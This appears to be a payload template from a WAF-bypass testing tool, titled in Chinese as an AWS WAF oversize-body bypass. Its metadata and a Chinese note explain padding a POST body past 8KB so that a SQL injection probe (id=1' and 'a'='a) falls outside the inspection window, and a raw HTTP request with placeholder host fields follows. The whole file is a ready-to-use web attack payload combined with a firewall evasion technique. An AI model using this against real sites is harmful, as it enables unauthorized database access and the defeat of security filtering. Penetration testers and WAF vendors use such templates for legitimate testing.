# @name: AWS WAF 超大 Body 绕过
# @tags: post,oversize,aws,sqli,id,bypass
# @color: red
# @validate: baseline_similarity
# @threshold: 0.92
# @intent: oversize_body_padding
# @intent.param: id
# @intent.payload: pad=<8KB+>&id=1' and 'a'='a
# @note: AWS WAF 默认仅检查请求体前 8KB(可控上限 size 8192)，在前面填充超过 8KB 的无意义数据，把真实 payload 放在 8KB 之后，使其落在检查窗口外而被放行。
POST / HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}
Content-Type: application/x-www-form-urlencoded

&id=1'+and+'a'='a
